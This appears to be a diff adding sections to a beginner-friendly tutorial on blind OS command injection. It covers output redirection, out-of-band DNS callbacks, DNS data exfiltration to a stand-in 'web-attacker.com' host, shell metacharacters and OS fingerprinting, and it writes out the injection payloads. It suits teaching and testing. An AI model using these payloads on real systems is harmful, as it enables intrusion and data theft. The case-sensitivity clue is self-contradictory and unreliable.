@@ -200,3 +200,242 @@ Think of this like testing if someone is home by listening for a specific delay 
 2. **The Forced Pause:** The backend application freezes up, dutifully counting down 10 seconds worth of network packets before it finishes its job.
 3. **Measuring the Lag:** You watch your browser's network tab or stopwatch. If the page normally loads instantly but suddenly hangs for precisely 10 seconds, you have absolute confirmation.
 4. **The Verdict:** The artificial delay unmasks the blind vulnerability, proving beyond a shadow of a doubt that your commands are executing on the host server!
+
+### ⚡ Attack Style: Blind OS Command Injection via Output Redirection (The Smuggled File Drop)
+
+**The Goal:** Exfiltrate the terminal output of a blind command injection by forcing the server to dump the results into a public web directory, allowing you to fetch and read the file directly through your browser.
+
+---
+
+#### 🧩 Concept: Slipping a Note Through the Front Door
+
+* **The Blind Problem:** The application executes your commands in the background, but it never prints the terminal results back into the web page response.
+* **The Web Root Trick:** Every web server has a "web root"—a designated directory on the filesystem where it stores public files (like images, CSS sheets, and static pages) that anyone can visit via a URL.
+* **The Exfiltration Strategy:** If you can't *shout* the output back through the response, you can write the command's results into a text file right inside that public web folder. Once it's there, you simply use your browser to download and read it!
+
+---
+
+#### 🛠️ The Payload & How It Works
+
+* **The Injected Payload:**
+```text
+& whoami > /var/www/static/whoami.txt &
+
+```
+
+
+* **How the Payload Works:**
+* `whoami` $\rightarrow$ Executes the reconnaissance command to find the current user.
+* `>` $\rightarrow$ The shell redirection operator. Instead of printing to the screen, it grabs the output and writes it into a file.
+* `/var/www/static/whoami.txt` $\rightarrow$ The absolute path pointing directly into the server's public static web directory.
+* *(The trailing `&` acts as a safety separator to keep the surrounding command syntax from breaking).*
+
+
+* **The Retrieval Step:**
+Once executed, you browse directly to the file via HTTP:
+```text
+https://vulnerable-website.com/whoami.txt
+
+```
+
+
+The server treats it like any normal static file and serves the command's secret output right to your screen!
+
+---
+
+#### 🎯 Plain-English Breakdown of the Attack
+
+Think of this like leaving a confidential document inside a public drop-box:
+
+1. **The Hidden Execution:** You inject your command into a blind parameter, instructing the server's terminal to run a tool like `whoami`.
+2. **The Redirection (`>`):** Instead of letting the output vanish into a black hole, you force the terminal to pipe the text straight into a new text file.
+3. **Planting the Evidence:** You place that text file inside a folder on the server that is already configured to be publicly downloadable.
+4. **The Pickup:** You walk up to the front door (by typing the file's URL into your browser) and casually pick up your own smuggled file to read the results!
+
+### ⚡ Attack Style: Blind OS Command Injection via Out-of-Band (OAST) (The Ping-Back Trap)
+
+**The Goal:** Prove that a blind command injection worked by tricking the target server into sending a network message to a private server that you control.
+
+---
+
+#### 🧩 Concept: Making the Server Call Home
+
+* **The Problem:** The app is totally blind. It doesn't show command output on the screen, and you don't want to mess around with slow time delays.
+* **The OAST Solution:** Instead of waiting for the server to talk to *you*, you force the server to talk to the outside world. You make it look up a website address that belongs to you.
+* **How You Catch It:** You monitor your own private server. The exact moment the target server tries to visit your domain, you get a notification—proving instantly that your command ran successfully!
+
+---
+
+#### 🛠️ The Payload & How It Works
+
+* **The Injected Payload:**
+```text
+& nslookup kgji2ohoyw.web-attacker.com &
+
+```
+
+
+* **How the Payload Works:**
+* `nslookup` $\rightarrow$ A built-in computer tool used to look up website addresses (DNS lookups).
+* `kgji2ohoyw.web-attacker.com` $\rightarrow$ A random, unique web address belonging to a server you own.
+* *The Result:* The target server's operating system tries to find your website, sending a network request straight to your logs.
+
+
+
+---
+
+#### 🎯 Plain-English Breakdown of the Attack
+
+Think of this like sending a homing pigeon to see if someone received your message:
+
+1. **The Hidden Call:** You inject a command that tells the server to look up a specific website address owned by you.
+2. **The Reach-Out:** The server dutifully obeys your command and knocks on the door of your external server to ask for directions.
+3. **The Catch:** Your server logs the visit, showing you a record of the request.
+4. **Success:** Even though the web app never showed you any output, your private logs light up—confirming 100% that you have command execution on the target machine!
+
+### ⚡ Attack Style: Blind OS Command Injection via OAST Data Exfiltration (The DNS Data Smuggle)
+
+**The Goal:** Extract sensitive command output (like user accounts or system data) from a completely blind target server by smuggling the data inside an outgoing DNS lookup request.
+
+---
+
+#### 🧩 Concept: Smuggling Data Through Website Names
+
+* **The Limitation of Standard OAST:** A basic DNS lookup tells you *that* a command ran, but it doesn't show you the actual answer (like what user account the server is running on).
+* **The Backtick Trick:** Terminal shells use backticks (```) to run a command first and paste its exact result directly into the text string before executing the main command.
+* **Hiding Data in Domain Names:** If you wrap a command like `whoami` inside the web address you tell the server to look up, the output becomes part of the domain name. When the server requests that address, your personal DNS server receives the data sitting right inside the URL prefix!
+
+---
+
+#### 🛠️ The Payload & How It Works
+
+* **The Injected Payload:**
+```text
+& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
+
+```
+
+
+* **How the Payload Works:**
+* ``whoami`` $\rightarrow$ Runs first behind the scenes, grabbing the current username (for example, `wwwuser`).
+* **The Assembly:** The shell combines that username with your domain, creating a brand new web address: `wwwuser.kgji2ohoyw.web-attacker.com`.
+* `nslookup` $\rightarrow$ Forces the server to look up this newly constructed address.
+
+
+
+---
+
+#### 🎯 Plain-English Breakdown of the Attack
+
+Think of this like writing your secret answer on the outside of an envelope before mailing it:
+
+1. **Running the Inside Task:** The server executes your hidden command (like `whoami`) and gets the result (e.g., `wwwuser`).
+2. **Attaching the Label:** It pastes that result directly onto the front of your website's address.
+3. **Mailing the Package:** The server sends a DNS lookup request looking for that custom web address out to the internet.
+4. **Reading the Mail:** Your private DNS server catches the incoming request logs, reads the prefix (`wwwuser`), and instantly hands you the secret data without the web application ever showing you a single word!
+
+### ⚡ Attack Style: Shell Metacharacters (The Command-Chaining Toolkit)
+
+**The Goal:** Learn how to use different terminal symbols (metacharacters) to chain, split, or inline commands across Windows and Unix systems—even when your input is locked inside quotation marks.
+
+---
+
+#### 🧩 Concept: The Punctuation of the Terminal
+
+* **What are Metacharacters?** These are special punctuation marks (like ampersands, pipes, and semicolons) that command-line shells use to manage multiple instructions.
+* **The Chaining Trick:** Instead of typing just one command, you use these characters to tell the system: *"Finish the first task, then immediately start running my custom command!"*
+* **The Rules Change by Operating System:** Some symbols work everywhere (Windows and Linux), while others only work on Unix-based systems. Plus, if the app wraps your input in quotation marks, you have to break out of them first before your metacharacters will work.
+
+---
+
+#### 🛠️ The Metacharacter Toolkit Cheat Sheet
+
+* **Universal Separators (Work on both Windows & Unix):**
+* `&` $\rightarrow$ Run the next command regardless of whether the first one succeeds.
+* `&&` $\rightarrow$ Run the next command **only if** the first command succeeds.
+* `|` $\rightarrow$ Pipe (send) the output of the first command straight into the input of the next command.
+* `||` $\rightarrow$ Run the next command **only if** the first command fails.
+
+
+* **Unix-Only Separators:**
+* `;` $\rightarrow$ Run commands sequentially, one after another.
+* `Newline` (`\n` or `0x0a`) $\rightarrow$ Pressing enter to force a brand-new command line.
+
+
+* **Unix Inline Execution (Running commands inside commands):**
+* ``injected command`` (Backticks) $\rightarrow$ Runs the command inside first and pastes the result right into the sentence.
+* `$(injected command)` $\rightarrow$ Does the exact same thing as backticks, but easier to nest.
+
+
+* **Escaping Quotes:**
+* If the app puts your input inside quotes like `value="YOUR_INPUT"`, your payload won't work until you type a matching quote (`"` or `'`) to close it out *before* adding your metacharacters.
+
+
+
+---
+
+#### 🎯 Plain-English Breakdown of the Technique
+
+Think of this like writing instructions in a text message:
+
+1. **The Punctuation Power:** Just like commas, periods, and conjunctions change how a sentence is read, terminal symbols change how a server reads your instructions.
+2. **Choosing the Right Tool:** If you are on a Linux server, a semicolon (`;`) or a newline is an easy way to start a fresh command. If you aren't sure what OS it is, universal symbols like `&` or `|` are your safest bet.
+3. **Breaking Out of Cages:** If the developer put your input inside quotation marks, you simply type a closing quote first to break free, drop your separator, and take full control of the terminal!
+
+### ⚡ Attack Style: OS Fingerprinting (Detecting the Server's Operating System)
+
+**The Goal:** Discover whether the target web application runs on a Linux/Unix or Windows operating system so you can choose the correct command payloads and attack vectors.
+
+---
+
+#### 🧩 Concept: Reading the Server's Digital Footprint
+
+* **Why It Matters:** Linux and Windows use completely different command sets, file paths, and shells. If you inject a Linux command (`whoami`) into a Windows server, it will fail. You need to know your target's operating system before executing OS commands.
+* **The Detective Work:** Web servers rarely hide their true nature completely. They accidentally leak clues through HTTP response headers, error messages, file naming conventions, and network packet behaviors.
+
+---
+
+#### 🛠️ Core OS Fingerprinting Techniques
+
+* **1. Checking HTTP Response Headers**
+* *What to look for:* Examine the `Server` or `X-Powered-By` headers using developer tools or Burp Suite.
+* *Clues:*
+* `Server: Microsoft-IIS/10.0` $\rightarrow$ Definitely Windows.
+* `Server: Apache/2.4.41 (Ubuntu)` or `nginx/1.18` $\rightarrow$ Likely Linux/Unix.
+
+
+
+
+* **2. The Case-Sensitivity Test**
+* *What to look for:* Linux filesystems are strictly case-sensitive, while Windows (NTFS) is case-insensitive.
+* *Clues:* If you request `/About.php` and `/about.php`, and both return the exact same page on Linux, but Windows might serve the file regardless of uppercase/lowercase differences.
+
+
+* **3. Analyzing Error Messages & Paths**
+* *What to look for:* Trigger a minor application error to see if the server leaks its file paths.
+* *Clues:*
+* Forward slashes (`/var/www/html/...`) $\rightarrow$ Linux/Unix.
+* Backslashes and drive letters (`C:\inetpub\wwwroot\...`) $\rightarrow$ Windows.
+
+
+
+
+* **4. Network TTL (Time-to-Live) Probing**
+* *What to look for:* Ping the target server and check the initial TTL value returned in the packet header.
+* *Clues:*
+* Linux / Unix $\rightarrow$ Initial TTL is usually **64**.
+* Windows $\rightarrow$ Initial TTL is usually **128**.
+
+
+
+
+
+---
+
+#### 🎯 Plain-English Breakdown of the Technique
+
+Think of this like figuring out what kind of car someone drives by looking at the tracks they leave behind:
+
+1. **Checking the Badges (Headers):** You look at the server's welcome banner in the HTTP response to see if it openly admits to running Windows IIS or Apache on Linux.
+2. **Testing the Rules (Case Sensitivity):** You tweak the capitalization of a URL. If the server throws a fit over a single capital letter, you know it's strict Linux; if it doesn't care, it's likely Windows.
+3. **Reading the Trash (Error Leaks):** If the app crashes or throws a verbose error, you scan the file paths for backslashes or forward slashes to instantly confirm whether you're dealing with a Linux filesystem or a Windows drive!
